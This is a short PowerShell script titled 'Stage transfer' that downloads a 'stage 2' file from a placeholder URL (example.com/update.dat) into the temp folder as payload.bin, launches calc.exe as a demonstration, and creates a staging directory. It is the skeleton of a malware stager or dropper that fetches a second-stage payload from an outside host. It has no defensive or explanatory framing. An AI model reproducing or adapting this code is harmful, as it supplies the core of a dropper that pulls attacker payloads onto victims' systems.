
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$Stage2Url = "http://example.com/update.dat",
    [string]$WorkingPath = "$env:TEMP\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath)
Start-Process -FilePath 'calc.exe'
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
